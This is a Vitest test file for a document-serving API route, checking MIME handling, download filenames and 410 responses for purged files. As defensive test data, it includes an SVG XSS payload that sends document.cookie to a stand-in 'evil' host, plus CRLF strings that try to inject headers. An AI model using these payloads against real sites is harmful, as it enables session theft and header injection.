import { readFileSync } from "node:fs";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { TRPCError } from "@trpc/server";

type Purge = { at: Date; reason: string | null; sha256: string; sizeBytes: number; bytesStillOnDisk: boolean };
type Doc = { sha256: string; mime: string; title: string; effectiveTitle?: string; purge?: Purge | null };

const docs = new Map<string, Doc>();

vi.mock("@/lib/trpc-server", () => ({
  serverCaller: async () => ({
    documents: {
      bySha: async ({ sha256 }: { sha256: string }) => {
        const doc = docs.get(sha256);
        if (!doc) throw new TRPCError({ code: "NOT_FOUND", message: "no such document" });
        // bySha returns effectiveDocument(): the immutable evidence title AND
        // the current one. The route has to pick, so the mock offers both.
        return { ...doc, effectiveTitle: doc.effectiveTitle ?? doc.title, purge: doc.purge ?? null };
      },
    },
  }),
}));

import { storeFile } from "@verder/api/src/storage";
import { GET } from "./[sha256]/route";

let vaultDir: string;

function registerDoc(doc: Doc): void {
  docs.set(doc.sha256, doc);
}

beforeEach(async () => {
  docs.clear();
  vaultDir = await mkdtemp(join(tmpdir(), "verder-files-"));
  process.env.VAULT_DIR = vaultDir;
});

afterEach(async () => {
  await rm(vaultDir, { recursive: true, force: true });
});

describe("GET /api/files/[sha256]", () => {
  it("serves a sniffed type inline when the stored mime says nothing", async () => {
    const buf = readFileSync(
      new URL("../../../../../../packages/parsers/fixtures/abn.xls", import.meta.url));
    const { sha256 } = await storeFile(vaultDir, buf);
    registerDoc({ sha256, mime: "application/octet-stream", title: "abn.xls" });

    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.headers.get("content-type")).toBe("application/vnd.ms-excel");
    expect(res.headers.get("content-disposition")).toContain("inline");
  });

  it("trusts an informative stored mime rather than re-sniffing", async () => {
    const buf = Buffer.from("%PDF-1.4\nx");
    const { sha256 } = await storeFile(vaultDir, buf);
    registerDoc({ sha256, mime: "application/pdf", title: "letter.pdf" });
    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.headers.get("content-type")).toBe("application/pdf");
  });

  it("downloads under the name the document has NOW, not the one it arrived with", async () => {
    // Content-Disposition beats the <a download> attribute, so getting this
    // wrong silently undoes every rename Martin makes.
    const buf = Buffer.from("%PDF-1.4\nx");
    const { sha256 } = await storeFile(vaultDir, buf);
    registerDoc({ sha256, mime: "application/pdf", title: "scan_001",
      effectiveTitle: "Beschikking bewind 2026" });
    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.headers.get("content-disposition")).toContain("Beschikking%20bewind%202026");
    expect(res.headers.get("content-disposition")).not.toContain("scan_001");
  });

  it("never serves an active type inline, and never lets the browser sniff", async () => {
    // The stored mime is the SENDER's Content-Type header. Rendered inline on
    // our origin, this SVG runs script with Martin's session.
    const svg = Buffer.from(
      `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil/'+document.cookie)"/>`);
    const { sha256 } = await storeFile(vaultDir, svg);
    registerDoc({ sha256, mime: "image/svg+xml", title: "bijlage.svg" });
    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.headers.get("content-disposition")).toContain("attachment");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("still serves a PDF inline, so the preview frame keeps working", async () => {
    const { sha256 } = await storeFile(vaultDir, Buffer.from("%PDF-1.4\nx"));
    registerDoc({ sha256, mime: "application/pdf", title: "letter.pdf" });
    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.headers.get("content-disposition")).toContain("inline");
  });

  it("does not brick a document whose stored mime contains a newline", async () => {
    // The mime is the sender's header text; a bare CR makes the Headers
    // constructor throw, and that throw used to fall through to a 500 — the
    // document could never be viewed or downloaded again.
    const { sha256 } = await storeFile(vaultDir, Buffer.from("%PDF-1.4\nx"));
    registerDoc({ sha256, mime: "text/html\r\nX-Injected: 1", title: "bijlage" });
    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.status).toBe(200);
    expect(res.headers.get("x-injected")).toBeNull();
    expect(res.headers.get("content-type")).toBe("application/octet-stream");
    expect(res.headers.get("content-disposition")).toContain("attachment");
  });

  it("keeps the base type when the stored mime carries parameters", async () => {
    const { sha256 } = await storeFile(vaultDir, Buffer.from("%PDF-1.4\nx"));
    registerDoc({ sha256, mime: "application/pdf; charset=binary", title: "letter.pdf" });
    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.headers.get("content-type")).toBe("application/pdf");
  });

  it("never lets a title inject a header", async () => {
    const buf = Buffer.from("%PDF-1.4\nx");
    const { sha256 } = await storeFile(vaultDir, buf);
    registerDoc({ sha256, mime: "application/pdf", title: 'evil"\r\nX-Injected: yes' });
    const res = await GET(new Request("http://localhost/api/files/x"),
      { params: Promise.resolve({ sha256 }) });
    expect(res.headers.get("x-injected")).toBeNull();
    expect(res.headers.get("content-disposition")).not.toContain("\n");
  });

  /**
   * 410, not 404. The document exists and we know exactly what happened to it;
   * "not found" would be a smaller truth than the one the app can tell. The
   * body names the reason so the page can say it in Dutch.
   */
  it("answers 410 Gone for a purged document", async () => {
    const sha256 = "b".repeat(64);
    registerDoc({
      sha256, mime: "application/pdf", title: "beschikking.pdf",
      purge: { at: new Date(), reason: null, sha256, sizeBytes: 3, bytesStillOnDisk: false },
    });
    const res = await GET(new Request("http://x/api/files/" + "b".repeat(64)),
      { params: Promise.resolve({ sha256: "b".repeat(64) }) });
    expect(res.status).toBe(410);
    await expect(res.json()).resolves.toMatchObject({ error: "purged" });
  });
});
